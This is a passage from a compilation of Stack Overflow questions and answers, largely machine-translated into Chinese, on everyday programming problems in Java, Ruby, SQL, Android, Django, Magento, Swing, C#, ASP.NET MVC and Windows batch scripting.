这不符合标准[Java 命名约定](http://www.oracle.com/technetwork/java/javase/documentation/codeconventions-135099.html#367)。只需省略`name`from 的属性`@ManagedBean`，它就会[默认](http://balusc.blogspot.com/2011/09/communication-in-jsf-20.html#ManagedBeanNames)为正确的。

# java - java中的破折号分隔符正在改变输出

> ID：15998126
> 
> 赞同：1
> 
> 时间：2013-04-14T10:37:10.627
> 
> 标签：java, arabic

我正在使用以下 java 代码将数字转换为阿拉伯语

```
 String str = "1234-5678-9101";

    char[] chars = {'٠','١','٢','٣','٤','٥','٦','٧','٨','٩'};
    StringBuilder builder = new StringBuilder();

    for (int i = 0; i < str.length(); ++i) {
        if (Character.isDigit(str.charAt(i))) {
            builder.append(Chars[(int)(str.charAt(i))-48]);
        } else {
            builder.append(str.charAt(i));
        }
    } 
```

预期的输出是٩١٠١-٥٦٧٨-١٢٣٤，但结果是١٢٣٤-٥٦٧٨-٩١٠١（反向）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T04:48:20.843

感谢大家，使用以下代码解决了此问题：

```
String str = "1234-5678-9101";

char[] chars = {'٠','١','٢','٣','٤','٥','٦','٧','٨','٩'};
StringBuilder builder = new StringBuilder();

for (int i = 0; i < str.length(); ++i) {
    if (Character.isDigit(str.charAt(i))) {
        builder.append(Chars[(int)(str.charAt(i))-48]);
    } else {
        builder.append("\u202A");
        builder.append(str.charAt(i));
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T10:49:01.093

代码有效，这很明显。但在我看来，破折号 ( `-`) 违反了从右到左的阿拉伯语书写规则——似乎每组数字都是正确的，但整体顺序却不正确。

```
expected: ٩١٠١-٥٦٧٨-١٢٣٤
actual: ١٢٣٤-٥٦٧٨-٩١٠١ 
```

我无能为力，因为这就是我对阿拉伯字母的了解。希望这可以帮助。

# ruby - Is there a better way to test this Ruby class with RSpec?

> ID：15998129
> 
> 赞同：0
> 
> 时间：2013-04-14T10:37:15.967
> 
> 标签：ruby, unit-testing, testing, rspec, tdd

I'm extracting a subset of fields from a full JSON dataset having a JSON fixture. The better way I could think of is the following :

```
require "spec_helper"

  # API ref.: GET /repos/:owner/:repo
  # http://developer.github.com/v3/repos/

  describe Elasticrepo::RepoSubset do

    context "extract a subset of repository fields" do
      let(:parsed) { Yajl::Parser.parse(fixture("repository.json").read) }
      subject { Elasticrepo::RepoSubset.new(parsed) }

      context "#id" do
        its(:id) { should eq(2126244) }
      end
      context "#owner" do
        its(:owner) { should eq("twitter") }
      end
      context "#name" do
        its(:name) { should eq("bootstrap") }
      end
      context "#url" do
        its(:url) { should eq("https://api.github.com/repos/twitter/bootstrap") }
      end
      context "#description" do
        its(:description) { should eq("Sleek, intuitive, and powerful front-end framework for faster and easier web development.") }
      end
      context "#created_at" do
        its(:created_at) { should eq("2011-07-29T21:19:00Z") }
      end
      context "#pushed_at" do 
        its(:pushed_at) { should eq("2013-04-13T03:56:36Z") }
      end
      context "#organization" do
        its(:organization) { should eq("Organization") }
      end
      context "#full_name" do
        its(:full_name) { should eq("twitter/bootstrap") }
      end
      context "#language" do
        its(:language) { should eq("JavaScript") }
      end
      context "#updated_at" do
        its(:updated_at) { should eq("2013-04-13T19:12:09Z") }
      end
    end
  end 
```

but I wonder if is there a better, smarter, cleaner or just more elegant way of doing that. The class I TDD out is this :

```
module Elasticrepo
  class RepoSubset
    attr_reader :id, :owner, :name, :url, :description, :created_at, :pushed_at,
                :organization, :full_name, :language, :updated_at
    def initialize(attributes)
      @id = attributes["id"]
      @owner = attributes["owner"]["login"]
      @name = attributes["name"]
      @url = attributes["url"]
      @description = attributes["description"]
      @created_at = attributes["created_at"]
      @pushed_at = attributes["pushed_at"]
      @organization = attributes["owner"]["type"]
      @full_name = attributes["full_name"]
      @language = attributes["language"]
      @updated_at = attributes["updated_at"]
    end
  end
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:36:31.447

我会删除各个上下文块。他们不添加任何额外的信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:39:47.740

我会使用键/值映射并进行迭代，或者创建一个具有正确值的对象并比较整个对象。

# sql - SQL Server 加入

> ID：15998132
> 
> 赞同：3
> 
> 时间：2013-04-14T10:37:53.953
> 
> 标签：sql, sql-server, ms-access

我当前正在处理的查询返回了所需的结果，但问题是我必须为要添加的每个额外列创建一个具有不同 TaskCounters 的附加连接（这当然不是一个理性的决定）。

**该查询应该在 SQLServer 以及 Access DB 上运行**，因此我不需要任何访问中不支持的特殊功能（如 Pivot、CTE 等）。我需要修改该查询，以便尽可能减少连接数。

tblConsultations 是主表，其中根据访问类型记录特定儿童的条目（即，如果我们有 4 次访问，我们有 4 个咨询条目）。结果列应显示这 4 次访问的值，如果访问没有值，则显示 NULL。

**我想消除对同一个表的额外连接的需要，我必须为每个额外的列添加这些连接**

查询如下：

```
SELECT Cast(SUBSTRING(tc2.ChildCounter, 7, LEN(tc2.ChildCounter)) AS NUMERIC) AS pkChildID
,tc2.VisitType
,tblQuitOffered.Result AS KWA_QuitOffered
,tblQuitReferral.Result As KWA_QuitReferral
FROM tblConsultations tc2
INNER JOIN tblChild tc ON tc2.ChildCounter = tc.ChildCounter
LEFT  JOIN tblDelivery td ON td.ChildCounter = tc.ChildCounter
LEFT JOIN (
SELECT ttr.ResultCounter
    ,ttr.ChildCounter
    ,tkt.VisitType
    ,ttr.Result
    ,ttr.TaskCounter
FROM tblTaskResults ttr
INNER JOIN tlkpKeyTasks tkt ON tkt.TaskCounter = ttr.TaskCounter
    AND tkt.TaskCounter IN (
        '001410'
        ,'001463'
        ,'001431'
        )

) AS tblQuitOffered ON tc2.VisitType = tblQuitOffered.VisitType
AND tblQuitOffered.ChildCounter = tc2.ChildCounter
LEFT JOIN (
SELECT  ttr.ChildCounter
    ,tkt.VisitType
    ,ttr.Result
FROM tblTaskResults ttr
INNER JOIN tlkpKeyTasks tkt ON tkt.TaskCounter = ttr.TaskCounter
    AND tkt.TaskCounter IN (
        '001411'
        ,'001464'
        ,'001432'
        )
) AS tblQuitReferral ON tc2.VisitType = tblQuitReferral.VisitType
AND tblQuitReferral.ChildCounter = tc2.ChildCounter
WHERE tc2.VisitType in (1, 2, 3, 4)
AND tc2.ConsDate BETWEEN '20130127' and '20130228'
ORDER BY tc2.ChildCounter,tc2.VisitType 
```

结果如下：

```
pkChildID   VisitType     KWA_QuitOffered   KWA_QuitReferral
2224        1             No                No
2224        3             NULL              NULL
2224        4             NULL              NULL
2225        1             No                Yes
2225        2             Yes               Yes
2225        3             Yes               Yes
2225        4             NULL              NULL 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T15:07:39.463

如果我理解正确，您可以`TaskCounter`在单个派生表中包含所需的所有值，然后使用`CASE`语句来分配列值：

```
SELECT Cast(SUBSTRING(tc2.ChildCounter, 7, LEN(tc2.ChildCounter)) 
            AS NUMERIC) AS pkChildID
      ,tc2.VisitType

      ,MAX(CASE WHEN tktResults.TaskCounter IN (
                '001410'
               ,'001463'
               ,'001431'
               ) THEN tktResults.Result END
          ) AS KWA_QuitOffered

      ,MAX(CASE WHEN tktResults.TaskCounter IN (
                '001411'
               ,'001464'
               ,'001432'
               ) THEN tktResults.Result END
          ) AS KWA_QuitReferral

FROM  tblConsultations tc2
INNER JOIN tblChild tc 
  ON  tc2.ChildCounter = tc.ChildCounter
LEFT  JOIN tblDelivery td
  ON  td.ChildCounter = tc.ChildCounter

LEFT JOIN (
   SELECT ttr.ResultCounter
         ,ttr.ChildCounter
         ,tkt.VisitType
         ,ttr.Result
         ,ttr.TaskCounter
   FROM tblTaskResults ttr
   INNER JOIN tlkpKeyTasks tkt 
   ON tkt.TaskCounter = ttr.TaskCounter
       AND tkt.TaskCounter IN (
            '001410'
           ,'001463'
           ,'001431'
           ,'001411'
           ,'001464'
           ,'001432'
           )
   ) AS tktResults 
ON     tktResults.VisitType    = tc2.VisitType
   AND tktResults.ChildCounter = tc2.ChildCounter

WHERE tc2.VisitType in (1, 2, 3, 4)
  AND tc2.ConsDate BETWEEN '20130127' and '20130228'
GROUP BY 1, 2
ORDER BY tc2.ChildCounter,tc2.VisitType 
```

事实上，您实际上并不需要将其设为派生表（`LEFT JOIN (...)`部分），但我假设您出于性能原因这样做。当您根据 的不同值添加列时`TaskCounter`，只需将它们添加到连接条件即可。

**编辑：**修改为使用`GROUP BY`带有函数的子句通过and`MAX`返回唯一行。`pkChildID``VisitType`

我在`GROUP BY`子句中使用“有序列表”样式；如果不支持，您可能需要像这样指定它：

```
GROUP BY Cast(SUBSTRING(tc2.ChildCounter, 7, LEN(tc2.ChildCounter)) AS NUMERIC)
        ,tc2.VisitType 
```

我还注意到您正在按不属于 SELECT 子句的列进行排序。我不知道为什么，但完好无损。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T15:32:58.903

我发布了一个答案，有些人认为就像 BellevueBob 发布的那样。

> 我认为您可以使用嵌套 iif() 而不是“case when”

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T04:07:04.957

通常在 SQL 中创建一个新表可以解决问题。让我们称之为coderesolve。

它看起来像这样：

```
Code    QuitOffered    QuitReferral
001410  1              Null
001462  1              Null
001431  1              Null
001411  Null           1
001464  Null           1
001432  Null           1 
```

您可以为要执行的每个“新”连接添加更多列。

然后你的代码看起来像这样

```
SELECT 
  Cast(SUBSTRING(tc2.ChildCounter, 7, LEN(tc2.ChildCounter)) AS NUMERIC) 
     AS pkChildID
  ,tc2.VisitType
  ,ttr.Result AS KWA_QuitOffered
  ,ttr.Result As KWA_QuitReferral
FROM tblConsultations tc2
INNER JOIN tblChild tc ON tc2.ChildCounter = tc.ChildCounter
LEFT  JOIN tblDelivery td ON td.ChildCounter = tc.ChildCounter
JOIN  tblTaskResults ttr on tc2.VisitType = ttr.VisitType
JOIN  tlkpKeyTasks tkt ON tkt.TaskCounter = ttr.TaskCounter
JOIN  coderesolve cr on cr.code = tkt.TaskCounter 
   AND COALESCE(cr.QuitOffered,cr.QuitReferral,0) = 1
WHERE tc2.VisitType in (1, 2, 3, 4)
AND tc2.ConsDate BETWEEN '20130127' and '20130228'
ORDER BY tc2.ChildCounter,tc2.VisitType 
```

这应该适用于 Access。但是 Access 很有趣，所以没有任何承诺。

另请注意，我假设您的代码是互斥的（在 coderesolve 连接上只给您一个行结果），如果不是这种情况，您可能必须将其分解为子查询并进行分组或不同-- 取决于您的型号。

# java - do while loop.. to proceed if correct input is given

> ID：15998135
> 
> 赞同：2
> 
> 时间：2013-04-14T10:38:12.230
> 
> 标签：java, while-loop, do-while

I am trying to do a while loop but it kept failing on me. So while date is not entered by the user, this will keep running until a valid date is entered. isValidDate is a method to check whether the date is true or false. Date will only be true when enter dd/mm/yy.

I am trying to put a check on whether the date is correct or not. If it is correct, it will be stored into the String date and the program will continue. If it is incorrect, the program will then prompt the user again for the correct date.

When I first enter a incorrect date, it will then prompt me for the correct date to be entered again. At this point, when I enter a correct date, the program could not verify if it is a correct date or not anymore. Why is this happening?

Please help!

```
 public void bookingA(){
        bkList = new ArrayList<bookingInfo>();

        Scanner keys = new Scanner(System.in);
        String date;

        System.out.println("\nEnter the date: ");
        while(!isValidDate(keys.nextLine())) {
            do {
               System.out.println("That is not a valid date! Please enter again (dd/mm/yy): ");
               date = keys.nextLine();
            } while (!isValidDate(date));
            System.out.print(date);
            break;
        }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T10:44:20.627

你在那里有无限循环，将其更改为：

```
System.out.println("\nEnter the date (dd/mm/yy): ");
while (true) {
    date = keys.nextLine();
    if (isValidDate(date)) {
         break;
    } else {
         System.out.println("That is not a valid date! Please enter again (dd/mm/yy): ");
    }
} 
System.out.print(date); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T10:46:02.823

每个都`keys.nextLine`需要另一个输入。您必须将输入读入一次变量，然后引用该变量！因为你正在每个内循环读取输入三遍。

**根据您编辑**后的代码进行编辑，仍然存在问题。您仍然有两个地方可以读取输入 - 在 while 循环和条件中。当您只需要一个时，您仍然有两个 while 循环。我删除了几行，并`date`在循环开始之前添加了一个初始分配。这让你：

```
public void bookingA(){
    bkList = new ArrayList<bookingInfo>();

    Scanner keys = new Scanner(System.in);
    String date;

    System.out.println("\nEnter the date: ");
    date = keys.nextLine();
    while(!isValidDate(date)) {
        System.out.println("That is not a valid date! Please enter again (dd/mm/yy): ");
        date = keys.nextLine();
    }
    System.out.print(date); 
```

注意 - 我试图维护您的代码的一些结构（即`while`实际测试变化条件的 a ）但 Milos 给出的答案（当日期有效时您会中断一个无限循环）可能是通常是更好的解决方案，因为您无需在输入日期之前将日期设置为某个值。另一方面，您可以说，在我建议的代码中，您的假设是用户输入了一个有效的日期，并且 while 循环在那里确认它，如果日期证明无效，则再给一次机会。

如您所见，两种解决方案都有效，但一种理念是“我将您置于此循环中，在您输入有效日期之前我不会让您出去”，而另一种解决方案是“我将继续检查您输入的日期是有效的，直到它是“。

但是两者都比您的原始代码更具可读性。一个简单的任务需要一个简单的代码结构。值得为之努力。

# java - How to go to another activity from button looping?

> ID：15998138
> 
> 赞同：0
> 
> 时间：2013-04-14T10:38:19.580
> 
> 标签：java, android, android-activity

How to go to another activity? I'm trying to go another activity from button. If I click one of the buttons, button must redirect to another actitivity, chapters.class. I tried Toast.make in OnClick function. It works. But when I coded to go another activity, apps crashed. How to solve that? Here is the code:

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.oldtestament);
    LinearLayout layout = (LinearLayout) findViewById(R.id.linearlayoutold);
    String[] values = { "Apple","Orange","Twitter","Yahoo","Google","English","Reddit","Settings" };
    Button[] b = new Button[values.length];
    for (int i = 0; i < b.length; i++) {
        b[i] = new Button(this);
    }
    for (int i = 0; i < values.length; i++) {
        LayoutParams params = new LinearLayout.LayoutParams(
                LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT);             
        ((MarginLayoutParams) params).setMargins(18, 2, 18, 2);
        b[i].setText(values[i]); 
        layout.addView(b[i], params);
        addListenerOnButton(b[i]);
    }
}

public void addListenerOnButton(Button b) {
    final Context context = this;
    b.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View arg0) {
            Intent intent = new Intent(context, chapters.class);
            startActivity(intent);
        }

    });

} 
```

Here is LogCat:

```
04-14 17:24:57.168: E/AndroidRuntime(23719): FATAL EXCEPTION: main
04-14 17:24:57.168: E/AndroidRuntime(23719): android.content.ActivityNotFoundException: Unable to find explicit activity class  {com.joshclemm.android.tabswithactivity/com.joshclemm.android.tabswithactivity.chapters};  have you declared this activity in your AndroidManifest.xml?
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.app.Instrumentation.checkStartActivityResult(Instrumentation.java:1405)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.app.Instrumentation.execStartActivity(Instrumentation.java:1379)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at and roid.app.Activity.startActivityFromChild(Activity.java:3067)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.app.Activity.startActivityForResult(Activity.java:2847)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.app.Activity.startActivity(Activity.java:2933)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at com.joshclemm.android.tabswithactivity.oldtestament$1.onClick(oldtestament.java:77)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.view.View.performClick(View.java:2552)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.view.View$PerformClick.run(View.java:9229)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.os.Handler.handleCallback(Handler.java:587)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.os.Handler.dispatchMessage(Handler.java:92)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.os.Looper.loop(Looper.java:130)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at android.app.ActivityThread.main(ActivityThread.java:3701)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at java.lang.reflect.Method.invokeNative(Native Method)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at java.lang.reflect.Method.invoke(Method.java:507)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:866)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:624)
04-14 17:24:57.168: E/AndroidRuntime(23719):    at dalvik.system.NativeStart.main(Native Method)
04-14 17:24:58.998: E/kernel(125): [70117.358337] binder: release proc 23719, transaction 2633713, not freed
04-14 17:24:58.998: E/kernel(125): [70117.358398] binder: release proc 23719, transaction 2633714, not freed
04-14 17:24:59.018: E/InputDispatcher(245): channel '2b33bae0 com.joshclemm.android.tabswithactivity/com.joshclemm.android.tabswithactivity.CustomTabActivity (server)' ~ Consumer closed input channel or an error occurred.  events=0x8
04-14 17:24:59.018: E/InputDispatcher(245): channel '2b33bae0 com.joshclemm.android.tabswithactivity/com.joshclemm.android.tabswithactivity.CustomTabActivity (server)' ~ Channel is unrecoverably broken and will be disposed! 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T11:16:45.750

呼……

在 Androidminifest.xml 中：

我加：

```
<activity
        android:name=".chapters"
        android:label="@string/app_name" > 
```

愚蠢的我。我以为 Elcipse 会自动完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:26:39.477

试试这个，像这样编辑你的上下文

```
Intent intent = new Intent(getApplicationContext(), chapters.class);
startActivity(intent); 
```

我认为你有问题是由于`final Context context = this;`

# django - How to limit a view to superuser only?

> ID：15998140
> 
> 赞同：28
> 
> 时间：2013-04-14T10:38:20.107
> 
> 标签：django

**view.py**

```
@login_required
@permission_required('is_superuser')
def score_reset(request):
   pass 
```

**url.py**

```
url(r'^score-reset/$', score_reset, name='score-reset'), 
```

I have the following code and to my surprise I still hit the function, despite being logged in with a non superuser. I was expecting to get a permission denied.

What am I missing?

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2013-04-14T11:48:16.500

`is_superuser` isn't a permission, it's an attribute on the user model. Django already has another [decorator you can make use of called `user_passes_test`](https://github.com/django/django/blob/master/django/contrib/auth/decorators.py#L14) to perform this check:

```
from django.contrib.auth.decorators import user_passes_test

@user_passes_test(lambda u: u.is_superuser)
def score_reset(self,...):
    ... 
```

*   [allowing only super user login](https://stackoverflow.com/questions/1404160/allowing-only-super-user-login)
*   [Django is_staff permission decorator](https://stackoverflow.com/questions/5833184/django-is-staff-decorator-problem)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2017-12-07T07:18:43.280

以上答案似乎适用于非常早期的 django 版本。它们比更新的版本有点复杂

对于 django 1.11，这里有点类似但更简单的策略。

视图.py

```
from django.contrib.auth.decorators import login_required

@login_required
def some_view(request):
if request.user.is_superuser:
    //allow access only to superuser
    return render(request, 'app/template1.html', args)
else:
    //allow access only to user
    return render(request, 'app/template2.html', args) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-09-20T09:33:57.673

如果您想对许多视图执行此检查，@user_passes_test 不是一个优雅的解决方案。您可以轻松编写自己的装饰器，例如 @staff_member_require。

[在这里](https://stackoverflow.com/a/46318226/8640093)，您可以看到一种可能的解决方案。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2020-12-08T12:07:12.030

使用 Django 的[UserPassesTestMixin](https://docs.djangoproject.com/en/3.1/topics/auth/default/#django.contrib.auth.mixins.UserPassesTestMixin)

创建自定义混合`SuperuserRequiredMixin`

```
#mixins.py
from django.contrib.auth.mixins import UserPassesTestMixin

class SuperuserRequiredMixin(UserPassesTestMixin):
    def test_func(self):
        return self.request.user.is_superuser 
```

用法

```
class SomeSuperUserOnlyView(SuperuserRequiredMixin, ListView):
    form_class = ExamForm
    template_name = 'exam/newexam.html' 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-01-14T07:26:53.807

您可以使用用户通过测试装饰器以您想要的任何方式限制访问。这是基于用户电子邮件示例的限制：

```
from django.contrib.auth.decorators import user_passes_test

def email_check(user):
    x = False
    if user.email == 'anyemailhere':
        x = True
    return x

# Create your views here.
@user_passes_test(email_check)
def dash_index(request):
    ... 
```

更多在这里[https://docs.djangoproject.com/en/2.1/topics/auth/default/#the-permission-required-decorator](https://docs.djangoproject.com/en/2.1/topics/auth/default/#the-permission-required-decorator)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-01-11T06:07:31.177

**SuperuserRequiredMixin**

另一个基于权限的 mixin。这专门用于要求用户成为超级用户。对于只有特权用户才能访问的工具非常有用。

第一次安装：`pip install django-braces`

**视图.py**

```
from braces.views import LoginRequiredMixin, SuperuserRequiredMixin

class SomeSuperuserView(LoginRequiredMixin, SuperuserRequiredMixin, TemplateView):
    template_name = "path/to/template.html" 
```

# easeljs - 为什么 Chrome 中的文字不流畅？

> ID：15998145
> 
> 赞同：2
> 
> 时间：2013-04-14T10:39:21.793
> 
> 标签：easeljs, createjs

当我在画布上渲染文本时，我注意到 IE9 中的结果文本是平滑且抗锯齿的，但在 Chrome 上进行相同的实验时，文本是锯齿状且不平滑..

有人可以解释一下吗？

我试图在[http://www.createjs.com/Docs/EaselJS/modules/EaselJS.html](http://www.createjs.com/Docs/EaselJS/modules/EaselJS.html)上检查文档，但是我找不到任何与文本的反锯齿相关的属性..

# magento - Magento set custom page title and description for sitemap pages

> ID：15998147
> 
> 赞同：1
> 
> 时间：2013-04-14T10:40:07.987
> 
> 标签：magento

I am looking for a method to add custom page title and meta description to Magento defaults `catalog/seo_sitemap/category/` & `catalog/seo_sitemap/product/` pages.

I have done this before on the built-in contacts page by updating the contacts.xml file with:

```
 <reference name="head">     
        <action method="setDescription"><title>my description here</title></action>
        <action method="setTitle"><title>My title here</title></action>
    </reference> 
```

This works absolutely fine. However, I currently do not know how I can apply this or a similar technique to the 2 pages I've outlined.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T14:52:53.390

做同样的事情，但在`catalog.xml`文件中应用它。您还可以设置`local.xml`以下内容：

```
<?xml version="1.0"?>
<layout version="0.1.0">
    <catalog_seo_sitemap_category translate="label">
        <reference name="head">
             <action method="setDescription" module="catalog"><title>Custom description here</title></action>
             <action method="setTitle" module="catalog"><title>Custom Site Map here</title></action>
        </reference>
    </catalog_seo_sitemap_category>
</layout> 
```

您可以将相同的方法应用于`catalog/seo_sitemap/product/`

# java - Swing MVC - 在已经可见时刷新 JComboBox 的内容

> ID：15998148
> 
> 赞同：4
> 
> 时间：2013-04-14T10:40:18.697
> 
> 标签：java, swing, jcombobox, uirefreshcontrol, comboboxmodel

我在控制器类中设置了组合框的模型

`cboCategory.setModel(new ModernDefaultComboBoxModel(model.getProductCategories()));`

`productCategories`是一个`List`。只是扩展的模型。`String``ModernDefaultComboBoxModel``DefaultComboBoxModel`

```
public class ModernDefaultComboBoxModel extends DefaultComboBoxModel{
    public ModernDefaultComboBoxModel(List<String> elements){
        super(elements.toArray());
    }
} 
```

现在在我的模型中，`productCategories`从数据库中填充`SwingWorker`

```
SwingWorker<Void, String> worker = new SwingWorker<Void, String>() {
    @Override
    protected Void doInBackground() throws Exception {
        //query and resultset stuff
        while (rs.next()) {
            publish(rs.getString(1));
        }
        //cleanup stuff
    }
    @Override protected void process(List<String> chunks){
        List<String> oldCategories = new ArrayList<String>(productCategories);
        for(String cat : chunks){
            productCategories.add(cat);
        }
        fireModelPropertyChange(PRODUCT_CATEGORIES, oldCategories, productCategories);
    }
    @Override
    protected void done(){
        //some stuff
    }
};
worker.execute(); 
```

您会看到每一个`publish`，它都会向其侦听器触发一个属性更改事件（`fireModelPropertyChange`只是 的一个包装器`firePropertyChange`）。

现在在我的模型监听器中，

```
@Override
    public void propertyChange(PropertyChangeEvent evt) {
        String propName = evt.getPropertyName();

        //some branching for the other models

        else if(ProductModel.PRODUCT_CATEGORIES.equals(propName)){
            List<String> newVal = (List<String>)evt.getNewValue();

            //notify the model of the combobox that the data is changed, so refresh urself
        }

        //some stuff
    } 
```

我陷入了`ModelListener`需要通知组合框模型中的数据已更改的视图中。我有同样的情况，`JTable`但`JTable`我可以`fireTableRowsInserted`从它实现的模型中调用`AbstractTableModel`。

实际上，在 中`AbstractListModel`有一种方法`fireContentsChanged`，但与 中不同`JTable`，此方法受到保护，因此我无法访问它。

我知道我可以创建一个实例，`ModernDefaultComboBoxModel`然后调用`setModel`组合框的方法来刷新组合框，但我只是想知道是否有一种像`JTable`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:05:18.107

`JComboBox``ListDataListener`为了听它自己的实现`ComboBoxModel`。对您的任何更改都`DefaultComboBoxModel`应该调用 中的相关`fireXxxx()`方法`AbstractListModel`，并且`JComboBox`应该看到更改。只需更新组合的模型`process()`。

附录：这是一个更新模型的最小示例。在 上设置断点`model.addElement()`，调试，单击`Add`，然后进入方法以查看对 的调用`fireIntervalAdded()`，随后会更新视图。

```
JFrame f = new JFrame("ComboWorkerTest");
f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
f.setLayout(new GridLayout(0, 1));
final JComboBox jcb = new JComboBox(new Integer[]{value});
f.add(new JButton(new AbstractAction("Add") {
    @Override
    public void actionPerformed(ActionEvent e) {
        DefaultComboBoxModel model = (DefaultComboBoxModel) jcb.getModel();
        model.addElement(++value);
    }
}));
f.add(jcb);
f.pack();
f.setLocationRelativeTo(null);
f.setVisible(true); 
```

# c# - 网址下载

> ID：15998150
> 
> 赞同：0
> 
> 时间：2013-04-14T10:40:26.970
> 
> 标签：c#, webclient

我正在使用 c#。我正在尝试查看 web url 是否包含字符串。我目前正在使用

```
using (var client = new WebClient())
            {
                result = client.DownloadString(WebUrl);

            }
             if (result.Contains(String))
            {
                return true;
            } 
```

我正在为大约 300 个网址执行此操作，是否有更快的方法或者我必须下载每个网页？

# c# - 在 ASP.NET MVC 中单独刷新表中的每一行

> ID：15998152
> 
> 赞同：1
> 
> 时间：2013-04-14T10:40:34.217
> 
> 标签：c#, javascript, jquery, ajax, asp.net-mvc

我正在努力解决在 ASP MVC 应用程序中刷新表中每一行的问题。

我有一个对象列表，其中每个对象都包含一个 url 和 refreshTime。应用程序应该提供一个表格，其中每一行代表列表中的每个对象。对于每一行，它必须检查 url 是否仍然可用。每行都有不同的刷新时间。

我的问题是我不知道如何使用 Javascripts 来做到这一点。我尝试使用 jQuery、Ajax 但失败了。我知道如何使用 Js 刷新所有表，但是如何使用不同的刷新时间分别刷新每一行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-28T18:14:23.137

如果您有下表：

```
<table border=1>
    <thead>
        <td class="url">Url</td>
        <td class="interval">Interval</td>
        <td class="status">Status</td>
    </thead>
    <tbody>
        <tr>
            <td class="url">http://www.google.com</td>
            <td class="interval">2000</td>
            <td class="status"></td>
        </tr>
        <tr>
            <td class="url">http://www.bing.com</td>
            <td class="interval">5000</td>
            <td class="status"></td>
        </tr>
    </tbody>
</table> 
```

您可以使用以下 jQuery 代码片段单独更新每一行：

```
$("tbody tr").each(function () {
    var row = $(this);
    var interval = row.find(".interval").text();
    setInterval(function(){updateRow(row);}, interval);
});

function updateRow(row) {
    var url = row.find(".url").text();
    var statusCell = row.find(".status");

    statusCell.text("last checked: " + new Date().toLocaleString());

    var checking = $.post('/api/statuses', { "": url });

    checking.done(function (data) {
        var responding = data;
        if (responding) {
            statusCell.css("background", "green");
        } else {
            statusCell.css("background", "red");
        }
    });
} 
```

也可在[http://jsfiddle.net/hummlas/pyh9c/](http://jsfiddle.net/hummlas/pyh9c/)

实际的状态检查有点复杂，但由于您不允许进行跨域 ajax 调用，您可以通过使用代理来解决这个问题，例如创建一些服务器端代码来进行状态检查，然后您只需 ajax 使用您想要获取其状态的 url 调用您的代理。

**编辑：**

我添加了一个使用 ASP.NET Web API 控制器的状态检查代理服务的示例实现

```
public class StatusesController : ApiController
{
    [HttpPost]
    public bool Post([FromBody]string value)
    {
        return CheckStatus(value);
    }

    private bool CheckStatus(string url)
    {
        var request = (HttpWebRequest)WebRequest.Create(url);
        request.Method = "HEAD"; //only retrieve headers

        HttpWebResponse response;
        try
        {
            response = (HttpWebResponse)request.GetResponse();
        }
        catch (WebException e)
        {
            response = (HttpWebResponse) e.Response;   
        }

        var responseCode = (int)response.StatusCode;
        return responseCode < 400; //erroneus response codes starts at 400
    }

} 
```

# windows - Windows命令行脚本根据用户定义的起始变量在FOR循环中递减变量

> ID：15998163
> 
> 赞同：1
> 
> 时间：2013-04-14T10:41:56.910
> 
> 标签：windows, command-line, for-loop, batch-file

我正在尝试编写看似简单的脚本，但我无法弄清楚。

基本上，用户会被问到问题 1：“他们想要添加多少（在这种情况下）视频文件以创建 1 个大视频文件？”

然后用户会被问到问题 2：“您要添加在一起的文件的名称是什么？” 现在这是我遇到的问题...

如何创建一个 for 循环，询问问题 2 第一个问题中给出的次数并将每个答案保存为唯一变量（我猜是变量递减）

在我从用户那里获得所有正确的文件名之后，程序将根据视频程序语法调用视频程序（我不需要帮助的那个语法，我理解那部分）

前任。（一个“？”表示我不知道该放什么）

@echo 关闭

set /p howmany=你要添加多少个文件？

为了 /？%%variable(???) in (%howmany%???) do (set /p inputfilename=你要添加的第一个文件的名称是什么？inputfilename=filename set %howmany%-1???= ％多少％？？？？）

因此，如果用户对问题 1 的回答为 5，则 for 循环应询问问题 2 5 次，并在每次给出答案时创建 5 个唯一变量。输入文件名1 = 电影1.mov 输入文件名2 = 电影2.mov 等等。

